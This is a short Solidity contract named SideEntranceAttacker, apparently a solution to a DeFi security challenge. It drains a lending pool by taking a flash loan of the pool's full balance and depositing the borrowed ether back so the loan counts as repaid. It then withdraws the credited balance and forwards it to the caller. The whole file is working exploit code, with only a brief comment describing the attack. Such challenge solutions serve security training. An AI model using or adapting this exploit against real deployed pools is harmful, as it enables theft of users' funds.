// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title SideEntranceAttacker
 * @author Jonatas Campos Martins
 * @dev Attack the pool depositing the flashloan value and then withdraw all the balance to attacker's *      account
 */
contract SideEntranceAttacker {
    using Address for address payable;

    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function executeFlashLoan() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
